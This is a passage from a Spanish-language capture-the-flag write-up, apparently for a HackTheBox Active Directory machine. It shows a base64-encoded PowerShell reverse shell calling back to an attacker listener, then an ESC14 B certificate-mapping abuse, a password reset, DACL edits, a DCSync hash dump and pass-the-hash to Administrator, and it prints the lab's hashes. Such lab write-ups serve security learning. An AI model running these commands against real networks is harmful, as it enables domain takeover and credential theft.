- `-i`: Dirección IP o `hostname` del DC (En este caso debemos usar el `hostname` para que funcione la autenticación a través de `kerberos`)
- `-r`: Reino `Kerberos` a usar para la autenticación

En este punto ya podemos ver la flag del usuario no privilegiado

~~~ bash
*Evil-WinRM* PS C:\Users\h.brown\Documents> type ..\Desktop\user.txt
99a...
~~~

### (Posible) Shell Improvement

Pondremos un listener a la espera de una shell, esto con el propósito de estabilizar la consola, porque en `evil-winrm` cuando usamos autenticación `kerberos`, muchas veces la herramienta falla

~~~ bash
rlwrap -cAr nc -lvnp 4444

listening on [any] 4444 ...
~~~

Desde `powershell` ejecutaremos un `oneliner` que ejecute una conexión hacia nuestra máquina, podemos construir rápidamente esta reverse shell en [revshells.com](https://www.revshells.com/)

~~~ powershell
*Evil-WinRM* PS C:\Users\h.brown\Documents> powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
~~~

Desde nuestro listener recibiremos la consola de `powershell`

~~~ bash
rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.65] 53640

[1]  + 128565 suspended  rlwrap -cAr nc -lvnp 4444
root@parrot nmap # stty raw -echo; fg      
[1]  + 128565 continued  rlwrap -cAr nc -lvnp 4444

* Enter *
PS C:\Users\h.brown\Documents> 
~~~
<br>


# Escalada de Privilegios
---
## Abusing AD CS - Using `ESC14 B` Technique

Esta técnica contempla la explotación de la configuración de mapeo explícito o `Explicit Mapping`.

> Explicit Mapping es un método de vinculación entre un certificado digital y una cuenta de usuario en Active Directory. Esta relación se define manualmente mediante atributos como `altSecurityIdentities` o reglas en el CA (Autoridad de Certificación).
{: .notice--info}

Esta técnica en teoría nos permite emitir un certificado como algún usuario víctima que posee una configuración débil del atributo `altSecurityIdentities`, que permita asignar un mapeo explícito de `RFC822` (`mail`) sin una validación del CA.
<br>
En el escenario `B` de esta técnica, debemos cumplir unos requisitos, los puedes consultar en el siguiente [artículo](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-b-target-with-x509rfc822-emailhttps://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-b-target-with-x509rfc822-email). Recordemos el contexto del usuario `d.baker`:

- Tenemos control sobre el atributo `mail` del usuario `d.baker`
- La plantilla `StaffAccessCertificte` muestra las flags `SubjectRequireEmail` y `NoSecurityExtension`
- El usuario `d.baker` puede emitir certificados válidos para autenticarse en el dominio utilizando esta plantilla

Utilizaremos la plantilla `StaffAccessCertificate`, tal como lo hicimos con el usuario `h.brown`. Cuando asignemos `altSecurityIdentities` y emitamos un certificado para autenticarnos, el atributo `mail` de `d.baker` debe coincidir con el atributo `altSecurityIdentities` del usuario que suplantaremos.
<br>
Podemos detectar los derechos de escritura en el atributo necesario mediante la herramienta [Get-WriteAltSecIDACEs.ps1](https://raw.githubusercontent.com/JonasBK/Powershell/refs/heads/master/Get-WriteAltSecIDACEs.ps1)

~~~ powershell
*Evil-WinRM* PS C:\Temp> upload Get-WriteAltSecIDACEs.ps1
*Evil-WinRM* PS C:\Temp> Import-Module Get-WriteAltSecIDACEs.ps1
~~~

Haremos una búsqueda en los objetos del dominio para encontrar usuarios sobre los que tengamos estos derechos

~~~ powershell
*Evil-WinRM* PS C:\Temp> Get-ADObject -Filter * -SearchBase "dc=scepter,dc=htb" | Get-WriteAltSecIDACEs


ObjectDN                : CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
InheritedObjectTypeName : User
ObjectTypeName          : Alt-Security-Identities
ActiveDirectoryRights   : WriteProperty
InheritanceType         : All
ObjectType              : 00fbf30c-91fe-11d1-aebc-0000f80367c1
InheritedObjectType     : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags             : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType       : Allow
IdentityReference       : SCEPTER\CMS
IsInherited             : True
InheritanceFlags        : ContainerInherit
PropagationFlags        : None

ObjectDN                : OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
InheritedObjectTypeName : User
ObjectTypeName          : Alt-Security-Identities
ActiveDirectoryRights   : WriteProperty
InheritanceType         : Descendents
ObjectType              : 00fbf30c-91fe-11d1-aebc-0000f80367c1
InheritedObjectType     : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags             : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType       : Allow
IdentityReference       : SCEPTER\CMS
IsInherited             : False
InheritanceFlags        : ContainerInherit
PropagationFlags        : InheritOnly
~~~

Tenemos la capacidad de modificar el atributo `altSecurityIdentities` del usuario `p.adams`. Si los buscamos dentro de `BloodHound`, notaremos que posee los privilegios suficientes para realizar un ataque `DC Sync`

![image-center](/assets/images/posts/scepter-bloodhound-5.png)
{: .align-center}

### Exploiting

Configuraremos un mapeo explícito con el atributo `mail` haciendo referencia a `p.adams`

~~~ bash
PS C:\Temp> $map = "X509:<RFC822>p.adams@scepter.htb"
~~~

Asignaremos la variable `$map` al atributo `altSecurityIdentities` del usuario `p.adams`

~~~
PS C:\Windows\Temp\Privesc> Set-ADUser -Identity p.adams -Replace @{altSecurityIdentities=$map}
~~~

Es posible validar que hemos modificado el atributo aplicando el filtro `-Properties`

~~~ bash
PS C:\Temp> Get-ADUser -Identity p.adams -Properties altSecurityIdentities

altSecurityIdentities : {X509:<RFC822>p.adams@scepter.htb}
DistinguishedName     : CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
Enabled               : True
GivenName             : p.adams
Name                  : p.adams
ObjectClass           : user
ObjectGUID            : a7ce1414-7b8e-41b7-9725-3686e4ed80a7
SamAccountName        : p.adams
SID                   : S-1-5-21-74879546-916818434-740295365-1109
Surname               : 
UserPrincipalName     : p.adams@scepter.htb
~~~

>Cuando emitamos un certificado que incluya el email `p.adams@scepter.htb` en su atributo SAN (Subject Alternative Name), podremos utilizarlo para autenticarnos como este usuario. 
{: .notice--warning}

> Posiblemente debamos volver a cambiar la contraseña y conseguir control total sobre `Staff Access Certificate` para el usuario `a.carter` debido al `Clean Up` de la máquina
{: .notice--danger}

~~~ bash
rpcclient -U 'd.baker%18b5fb0d99e7a475316213c15b6f22ce' 10.10.11.65 --pw-nt-hash -c 'setuserinfo2 a.carter 23 newP@assword2022'

dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'a.carter' -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'scepter.htb'/'a.carter':'newP@assword2022'
~~~

Cambiaremos el `mail` de `d.baker` a `p.adams@scepter.htb` siguiendo la misma lógica que con el usuario `h.brown` cuando explotamos `ESC9`. Esto lo hacemos para que coincida con el atributo `altSecurityIdentities` y podamos autenticarnos como `p.adams`

~~~ bash
bloodyAD -d scepter.htb -u a.carter -p 'newP@assword2022' --host dc01.scepter.htb --dc-ip 10.10.11.65 set object d.baker mail -v 'p.adams@scepter.htb'
~~~

Ahora emitimos un certificado válido para `d.baker`, que en realidad será para el usuario `p.adams`

~~~ bash
KRB5CCNAME=d.baker.ccache certipy req -u d.baker -k -no-pass -ca scepter-DC01-CA -template StaffAccessCertificate -target-ip dc01.scepter.htb -out p.adams
~~~

Con el certificado preparado, lo utilizaremos a modo de autenticación, obtendremos credenciales en caché y su hash NTLM

~~~ bash
certipy auth -pfx p.adams.pfx -username p.adams -domain scepter.htb -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[+] Trying to resolve 'scepter.htb' at '192.168.29.2'
[*] Using principal: p.adams@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'p.adams.ccache'
[*] Trying to retrieve NT hash for 'p.adams'
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
~~~

> Si obtienes el siguiente error: `[-] Name mismatch between certificate and user 'p.adams'`, intenta volver a asignar el atributo `altSecurityIdentities` a `p.adams` desde `powershell`
{: .notice--danger}


## DC Sync

Ya con la capacidad de autenticarnos como `p.adams`, podemos realizar un ataque DC Sync para extraer hashes NTLM de todos los usuarios del dominio.

> DCSync es un ataque que permite **simular el comportamiento de un controlador de dominio** (DC) y recuperar datos de contraseñas a través de la replicación de dominios
{: .notice--info}

~~~ bash
secretsdump.py scepter.htb/p.adams@dc01.scepter.htb -hashes :1b925c524f447bb821a8789c4b118ce0 -just-dc -dc-ip 10.10.11.65
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 
-
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
...
...
~~~


## PassTheHash

Podemos conectarnos como `Administrator` al dominio utilizando el hash NT y obtener una consola de `powershell`

~~~ bash
evil-winrm -i 10.10.11.65 -u Administrator -H a29...                                
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
scepter\administrator
~~~

Ya podremos ver la flag del sistema ubicada en la carpeta `C:\Users\Administrator\Desktop\root.txt`

~~~ bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
71e...
~~~ 

Gracias por ver hasta el final, espero haberte ayudado, te dejo la frase del día...
<br>
> Begin to weave and God will give you the thread.
> — German proverb
{: .notice--info}
